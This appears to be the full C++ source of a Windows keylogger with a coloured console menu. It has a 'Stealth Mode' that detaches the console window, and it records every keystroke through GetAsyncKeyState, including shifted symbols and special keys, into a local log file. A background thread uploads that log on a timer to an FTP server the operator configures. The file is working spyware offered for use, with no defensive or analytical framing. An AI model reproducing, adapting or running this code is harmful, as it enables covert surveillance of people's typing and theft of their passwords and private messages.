#include <iostream>
#include <fstream>
#include <string>
#include <conio.h>     // Only be using get character and get string function
#include <Windows.h>   // Library containing functions and headers to Interact with Windows API
#include <wininet.h>
#include <thread>
#include <ctime>

#pragma comment(lib, "Wininet") // Dependency

using namespace std;

// Function Declarations here
bool isShut();
bool isCaps();
bool isShift();
void printLogo();
string getFile();
void setColor(int);
string hidePassword();
void presser(string, int);
void writeLog(string, string);
bool hasEnding(string, string);
void symboler(char, string, int, bool);
void uploader(string, string, string, string, int);
void getFtp(string &, string &, string &, int &, string &);
bool execLogger(int, string, string, string, string, int, unsigned int);

// Constant Values Here
const short asyncReturn = -32767;    // Return Value for getAsyncKeyState from WinAPI
const int colorGreen = 10;
const int colorCyan  = 11;
const int colorRed   = 12;
const int colorPurple= 13;
const int colorYellow= 14;
const int colorWhite = 15;
const int colorGrey  = 8;
const int colorDblue = 9;
bool      uploadRunner = true;
string    tgtPath    = "";
unsigned int ftptimer = 3600;

int main(){
	int  toInput;
	bool loop = true;
	string username = "";
	string password = "";
	string ftphost  = "";
	string fname    = "";
	int    ftpport  = 0;

	while(loop){
		system("cls"); // Clear Screen On Every Output
		
		printLogo();

		setColor(colorYellow);
		cout << "\t1  -> ";
		setColor(colorWhite);
		cout << "Execute Keylogger in Simple Mode!" << endl;
		setColor(colorYellow);
		cout << "\t2  -> ";
		setColor(colorWhite);
		cout << "Execute Keylogger in Stealth Mode!" << endl;
		setColor(colorYellow);
		cout << "\t3  -> ";
		setColor(colorWhite);
		cout << "Enter FTP Server Details!" << endl;
		setColor(colorYellow);
		cout << "\t4  -> ";
		setColor(colorWhite);
		cout << "Define Path to Store Keystrokes in a file!" << endl;
		setColor(colorYellow);
		cout << "\t5  -> ";
		setColor(colorWhite);
		cout << "Set Timer after which to upload the files on FTP!" << endl;
		setColor(colorYellow);
		cout << "\t99 -> ";
		setColor(colorWhite);
		cout << "Exit ^_^" << endl;

		cout << endl << endl;

		setColor(colorCyan);
		cout << "\tEnter One of Above Choices: ";
		setColor(colorRed);
		cin  >> toInput;

		if(cin.fail()){
			cin.clear();
			cin.ignore(INT_MAX, '\n');
			toInput = 0;
		}

		switch(toInput){
		case 1:
		case 2:
			system("cls");
			setColor(colorWhite);

			if( execLogger(((toInput == 1) ? 1 : 2), fname, username, password, ftphost, ftpport, ftptimer) ){
				symboler('<', "Done!", colorGreen, true);
			}else{
				symboler('<', "Some Error has Occured!", colorRed, true);
			}

			cin.clear();
			cin.ignore(INT_MAX, '\n');

			break;

		case 3:
			{
				system("cls");
				getFtp(username, password, ftphost, ftpport, tgtPath);
				break;
			}

		case 4:
			system("cls");
			setColor(colorWhite);
			fname = getFile();
			break;

		case 5:
			system("cls");
			printLogo();
			do{
				symboler('*', "Enter Timer in Seconds: ", colorCyan, false);
				cout << endl << "\t";
				setColor(colorRed);
				cout << "_>  ";
				cin >> ftptimer;

				if(cin.fail() || ftptimer <= 15){
					symboler('-', "Invalid Value Supplied!  Not > 30!", colorRed, false);
					if(cin.fail()){
						cin.clear();
						cin.ignore(INT_MAX, '\n');
					}
				}
			}while(ftptimer <= 15);
			break;

		case 99:
			loop = false;
			break;

		default:
			setColor(colorRed);
			cout << endl << endl;
			cout << "\tInvalid Input Supplied!" << endl;
			getch();

			break;
		}
	}

	return 0;
}

// Function to Print Logo at Every Start
void printLogo(){
	setColor(colorRed);
	cout << endl << endl << endl;

	cout << "\t\t**************************************" << endl;
	cout << "\t\t**************************************" << endl;
	setColor(colorYellow);
	cout << "\t\t*   Developed by @hash3liZer         *" << endl;
	setColor(colorRed);
	cout << "\t\t**************************************" << endl;
	cout << "\t\t**************************************" << endl;
	cout << endl << endl;
	setColor(colorWhite);
}

// To Set Colors
void setColor(int color = colorWhite){
	HANDLE conHandler = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(conHandler, color);
}

// Function to Print Characters at start for Symbolization
void symboler(char symbol, string toPrint, int color = colorWhite, bool stop = false){
	HANDLE conHandler = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(conHandler, color);

	cout << "\t[" << symbol << "] ";
	SetConsoleTextAttribute(conHandler, colorWhite);
	cout << toPrint << endl;

	if(stop){
		getch();
	}
}

// Print Detected Keys
void presser(string key, int code){
	HANDLE conHandler = GetStdHandle(STD_OUTPUT_HANDLE);
	
	SetConsoleTextAttribute(conHandler, colorGreen);
	cout << "\t[-] ";
	SetConsoleTextAttribute(conHandler, colorWhite);
	cout << "Detected Type ";
	SetConsoleTextAttribute(conHandler, colorRed);
	cout << "[Press] ";
	SetConsoleTextAttribute(conHandler, colorWhite);
	cout << "Key ";
	SetConsoleTextAttribute(conHandler, colorGreen);
	cout << "[" << key << "] ";
	SetConsoleTextAttribute(conHandler, colorWhite);
	cout << "Ascii ";
	SetConsoleTextAttribute(conHandler, colorRed);
	cout << "[" << code << "]" << endl;
}

// Check When CTRL+ALT+F10 is pressed
bool isShut(){
	if(GetAsyncKeyState(VK_F10) == asyncReturn && (GetKeyState(VK_MENU) & 0x8000) != 0 && (GetKeyState(VK_CONTROL) & 0x8000) != 0){
		return true;
	}else{
		return false;
	}
}

// Checks When Capslock is on
bool isCaps(){
	if((GetKeyState(VK_CAPITAL) & 0x0001) != 0){
		return true;
	}else{
		return false;
	}
}

// Check When Shift is Down
bool isShift(){
	if((GetKeyState(VK_SHIFT) & 0x8000) != 0){
		return true;
	}else{
		return false;
	}
}

// Checks ending part of a string
bool hasEnding(string fullString, string ending){
    if (fullString.length() >= ending.length()) {
        return (0 == fullString.compare(fullString.length() - ending.length(), ending.length(), ending));
    }else{
        return false;
    }
}

// Hiding Password
string hidePassword(){
	string retval;
	char password[60];
	int n = 0;

	do{
		password[n] = getch();
		if(password[n] == 8){   // Entered Backspace
			cout << "\b \b";
			n--;
		}else if(password[n] == '\r'){
			n++;
		}else{
			cout << "*";
			n++;
		}
	}while(password[n-1]!='\r');
	password[n-1] = '\0';
	cout << endl;

	retval = password;
	return retval;
}

// Get the Name of File for local Storage
string getFile(){
	string rtval;
	ofstream toCheck;

	printLogo();

	cin.clear();
	cin.ignore(INT_MAX, '\n');
	
	cout << endl << endl << endl;
	symboler('?', "Enter Filename/Path to Store Keylogs Locally: ", colorYellow, false);

	do{
		cout << endl << "\t";
		setColor(colorRed);
		cout << "_>  ";
		
		setColor(colorYellow);
		getline(std::cin, rtval);
		toCheck.open(rtval, ios::app);

		if(!toCheck){
			symboler('~', "Failed to Open File. Check Filepath -- ", colorRed);
		}
	}while(!toCheck);

	toCheck.close();

	return rtval;
}

// Get FTP Server Details
void getFtp(string &username, string &password, string &ftphost, int &ftpport, string &tgtpath){
	printLogo();
	bool success = false;

	do{
		cin.clear();
		cin.ignore(INT_MAX, '\n');

		cout << endl;
		symboler('?', "Enter Target Path to Upload File: ", colorYellow, false);
		cout << endl << "\t";
		setColor(colorRed);
		cout << "_>  ";
		setColor(colorYellow);
		getline(cin, tgtpath);

		cout << endl;
		symboler('?', "Enter Username for FTP Server: ", colorYellow, false);
		cout << endl << "\t";
		setColor(colorRed);
		cout << "_>  ";
		setColor(colorYellow);
		getline(cin, username);

		cout << endl;
		symboler('?', "Enter Password for FTP Server: ", colorYellow, false);
		cout << endl << "\t";
		setColor(colorRed);
		cout << "_>  ";
		setColor(colorYellow);
		getline(cin, password);
		//password = hidePassword();

		cout << endl;
		symboler('?', "Enter FTP Host: ", colorYellow, false);
		cout << endl << "\t";
		setColor(colorRed);
		cout << "_>  ";
		setColor(colorYellow);
		getline(cin, ftphost);

		cout << endl;
		symboler('?', "Enter FTP Port: ", colorYellow, false);
		cout << endl << "\t";
		setColor(colorRed);
		cout << "_>  ";
		setColor(colorYellow);
		cin >> ftpport;

		if(!(hasEnding(tgtpath, "/"))){
			tgtpath = tgtpath + string("/");
		}

		if(cin.fail()){
			cin.clear();
			cin.ignore(INT_MAX, '\n');
			ftpport = 21;
		}

		cout << endl;
		symboler('*', "Checking Connection to Internet", colorCyan, false);
		HINTERNET iSession = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
		if(iSession){
			symboler('*', "Connection to the Internet Succeeded!", colorGreen, false);
			symboler('*', "Checking Connection to FTP Server", colorCyan, false);
			HINTERNET ftpSession = InternetConnect(iSession, ftphost.c_str(), ftpport, username.c_str(), password.c_str(), INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
			if(ftpSession){
				symboler('*', "Connection to the FTP Server Succeeded!. Stored!", colorGreen, false);
				Sleep(1000);
				success = true;
			}else{
				symboler('-', "Connection Failed to Server. Check Your Credentials", colorRed, false);
			}
			InternetCloseHandle(ftpSession);
		}else{
			symboler('-', "No Internet Connection Detected!", colorRed, false);
		}
		InternetCloseHandle(iSession);
	}while(!success);
	return;
}

// Writing Keys on Local File
void writeLog(string toWrite, string fname){
	static int firstTime = true;

	if(fname != ""){
		ofstream filer;
		filer.open(fname, ios::app);

		if(filer){
			if(toWrite.length() > 0){
				if(toWrite.length() == 1){
					filer << toWrite;
				}else{
					if(firstTime){
						filer << toWrite << endl;
					}else{
						filer << endl << toWrite << endl;
					}
				}
			}
			filer.close();
		}

		firstTime = false;
	}
}

// Uploading File to Server
void uploader(string fname, string username, string password, string ftphost, int ftpport){
	if(username == "" || password == "" || fname == ""){
		return;
	}

	time_t timer = NULL;
	char   timeStamper[50];
	string uploadComFile = "";
	time_t delay = time(NULL);

	while(uploadRunner){
		if(difftime(time(NULL), delay) > ftptimer){
			delay = time(NULL);
			timer = time(NULL);

			strftime(timeStamper, 50, "%d-%m-%Y", localtime(&timer));
			uploadComFile = tgtPath + string(timeStamper);
	
			symboler('*', "Checking Connection to Internet", colorCyan, false);
			HINTERNET iSession = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
			if(iSession){
				symboler('*', "Connection to the Internet Succeeded!", colorGreen, false);
				symboler('*', "Checking Connection to FTP Server", colorCyan, false);
				HINTERNET ftpSession = InternetConnect(iSession, ftphost.c_str(), ftpport, username.c_str(), password.c_str(), INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
				if(ftpSession){
					symboler('*', "Connection to the FTP Server Succeeded!. Stored!", colorGreen, false);
					if(FtpPutFile(ftpSession, fname.c_str(), uploadComFile.c_str(), FTP_TRANSFER_TYPE_BINARY, 0)){
						symboler('-', string("Uploaded - ") + uploadComFile, colorGreen, false);		
					}else{
						symboler('-', "Failed in Uploading!", colorRed, false);
					}
				}else{
					InternetCloseHandle(iSession);
					symboler('-', "Connection Failed to Server. Check Your Credentials", colorRed, false);
				}
			}else{
				symboler('-', "No Internet Connection Detected!", colorRed);
			}
		}
	}
}

// Execution of Logger and Mapping of Keys. 
bool execLogger(int runState, string fname, string username, string password, string ftphost, int ftpport, unsigned int ftptimer){
	bool runner = true;
	string sKeyA;
	string sKeyB;
	string sKeyC;
	int    sCodC;

	printLogo();
	symboler('>', "Starting Keylogger!", colorYellow, false);

	if(username != "" && password != "" && fname != ""){
		symboler('-', "Will be uploading Logs Every Given Interval!", colorCyan, false);
	}else{
		if(fname == ""){
			symboler('-', "Log File Not Defined. No Storing will Occur!", colorCyan, false);
		}
		if(username == ""){
			symboler('-', "Credentials Not Specified. No Storing will Occur!", colorCyan, false);
		}
	}

	if(runState == 2){
		symboler('#', "Freeing Console in 3 Seconds ...", colorGreen, false);
		Sleep(3000);
		FreeConsole();
	}

	thread ftpLoader(uploader, fname, username, password, ftphost, ftpport);

	Sleep(500);

	cout << endl;

	while(runner){
		sKeyA = "";
		sKeyB = "";
		sKeyC = "";
		sCodC = 0;

		if(isShut()){
			if(runState == 2){
				exit(0);
			}
			runner = false;
			uploadRunner = false;
			symboler('-', "Cleaning the Grid Now...", colorRed, false);
			break;
		}

		for(int key=65; key <= 90; ++key){     // Mapping Alphabets Capital and Small Case
			if(GetAsyncKeyState(key) == asyncReturn){
				if(isShift() || isCaps()){
					sKeyA = (char) key;
				}else{
					sKeyA = (char)(key + 32);
				}
				presser(sKeyA, key);
				writeLog(sKeyA, fname);
			}
		}

		for(int key=48; key <= 57; ++key){      // Mapping Numbers from 0-9 and !@#$%^&*()
			if(GetAsyncKeyState(key) == asyncReturn){
				if(isShift()){
					if(key == 48){
						sKeyB = ")";
					}else if(key == 49){
						sKeyB = "!";
					}else if(key == 50){
						sKeyB = "@";
					}else if(key == 51){
						sKeyB = "#";
					}else if(key == 52){
						sKeyB = "$";
					}else if(key == 53){
						sKeyB = "%";
					}else if(key == 54){
						sKeyB = "^";
					}else if(key == 55){
						sKeyB = "&";
					}else if(key == 56){
						sKeyB = "*";
					}else{
						sKeyB = "(";
					}
				}else{
					sKeyB = (char) key;
				}
				presser(sKeyB, key);
				writeLog(sKeyB, fname);
			}
		}

		// http://nehe.gamedev.net/article/msdn_virtualkey_codes/15009/
		// Key Mapping

		if(GetAsyncKeyState(VK_SPACE) == asyncReturn){ // Mapping Space
			sKeyC = " ";
			sCodC = VK_SPACE;
		}

		if(GetAsyncKeyState(VK_OEM_COMMA) == asyncReturn){ // Mapping , and <
			sKeyC = (isShift()) ? "<" : ",";
			sCodC = VK_OEM_COMMA;
		}

		if(GetAsyncKeyState(VK_OEM_PERIOD) == asyncReturn){ // Mapping . and >
			sKeyC = (isShift()) ? ">" : ".";	
			sCodC = VK_OEM_PERIOD;
		}

		if(GetAsyncKeyState(VK_OEM_2) == asyncReturn){ // Mapping / and ?
			sKeyC = (isShift()) ? "?" : "/";
			sCodC = VK_OEM_2;
		}

		if(GetAsyncKeyState(VK_OEM_1) == asyncReturn){ // Mapping ; and :
			sKeyC = (isShift()) ? ":" : ";";
			sCodC = VK_OEM_1;
		}

		if(GetAsyncKeyState(VK_OEM_7) == asyncReturn){ // Mapping ' and "
			sKeyC = (isShift()) ? "\"" : "'";
			sCodC = VK_OEM_7;
		}

		if(GetAsyncKeyState(VK_OEM_4) == asyncReturn){ // Mapping [ and {
			sKeyC = (isShift()) ? "{" : "[";
			sCodC = VK_OEM_4;
		}

		if(GetAsyncKeyState(VK_OEM_6) == asyncReturn){ // Mapping ] and }
			sKeyC = (isShift()) ? "}" : "]";
			sCodC = VK_OEM_6;
		}

		if(GetAsyncKeyState(VK_OEM_5) == asyncReturn){ // Mapping \ and |
			sKeyC = (isShift()) ? "|" : "\\";
			sCodC = VK_OEM_5;
		}

		if(GetAsyncKeyState(VK_OEM_3) == asyncReturn){ // Mapping ` and ~
			sKeyC = (isShift()) ? "~" : "`";
			sCodC = VK_OEM_3;
		}

		if(GetAsyncKeyState(VK_OEM_PLUS) == asyncReturn){ // Mapping = and +
			sKeyC = (isShift()) ? "+" : "=";
			sCodC = VK_OEM_PLUS;
		}

		if(GetAsyncKeyState(VK_OEM_MINUS) == asyncReturn){ // Mapping - and _
			sKeyC = (isShift()) ? "_" : "-";
			sCodC = VK_OEM_MINUS;
		}

		if(GetAsyncKeyState(VK_TAB) == asyncReturn){ // Mapping Tab
			sKeyC = "[Tab]";
			sCodC = VK_TAB;
		}	

		if(GetAsyncKeyState(VK_ESCAPE) == asyncReturn){ // Mapping Escape
			sKeyC = "[Escape]";
			sCodC = VK_ESCAPE;
		}	

		if(GetAsyncKeyState(VK_BACK) == asyncReturn){ // Mapping Backspace
			sKeyC = "[Backspace]";
			sCodC = VK_BACK;
		}

		if(GetAsyncKeyState(VK_CONTROL) == asyncReturn){ // Mapping Ctrl
			sKeyC = "[Ctrl]";
			sCodC = VK_CONTROL;
		}	

		if(GetAsyncKeyState(VK_MENU) == asyncReturn){ // Mapping Alt
			sKeyC = "[Alt]";
			sCodC = VK_MENU;
		}	

		if(GetAsyncKeyState(VK_UP) == asyncReturn){ // Mapping Up
			sKeyC = "[Up]";
			sCodC = VK_UP;
		}	

		if(GetAsyncKeyState(VK_DOWN) == asyncReturn){ // Mapping Down
			sKeyC = "[Down]";
			sCodC = VK_DOWN;
		}	

		if(GetAsyncKeyState(VK_LEFT) == asyncReturn){ // Mapping Left
			sKeyC = "[Left]";
			sCodC = VK_LEFT;
		}	

		if(GetAsyncKeyState(VK_RIGHT) == asyncReturn){ // Mapping Right
			sKeyC = "[Right]";
			sCodC = VK_RIGHT;
		}	

		if(GetAsyncKeyState(VK_HOME) == asyncReturn){ // Mapping Home
			sKeyC = "[Home]";
			sCodC = VK_HOME;
		}	

		if(GetAsyncKeyState(VK_END) == asyncReturn){ // Mapping End
			sKeyC = "[End]";
			sCodC = VK_END;
		}	

		if(GetAsyncKeyState(VK_PRIOR) == asyncReturn){ // Mapping Page Up
			sKeyC = "[Page Up]";
			sCodC = VK_PRIOR;
		}	

		if(GetAsyncKeyState(VK_NEXT) == asyncReturn){ // Mapping Page Down
			sKeyC = "[Page Down]";
			sCodC = VK_NEXT;
		}	

		if(GetAsyncKeyState(VK_DELETE) == asyncReturn){ // Mapping Delete
			sKeyC = "[Delete]";
			sCodC = VK_DELETE;
		}	

		if(GetAsyncKeyState(VK_RETURN) == asyncReturn){ // Mapping Enter
			sKeyC = "[Enter]";
			sCodC = VK_RETURN;
		}	

		if(GetAsyncKeyState(VK_INSERT) == asyncReturn){ // Mapping Tab
			sKeyC = "[Insert]";
			sCodC = VK_INSERT;
		}	

		if(GetAsyncKeyState(VK_PRINT) == asyncReturn){ // Mapping Tab
			sKeyC = "[Print]";
			sCodC = VK_PRINT;
		}	

		if(sKeyC != ""){
			presser(sKeyC, sCodC);
			writeLog(sKeyC, fname);
		}
	}

	ftpLoader.join();
	exit(0);
	return true;
}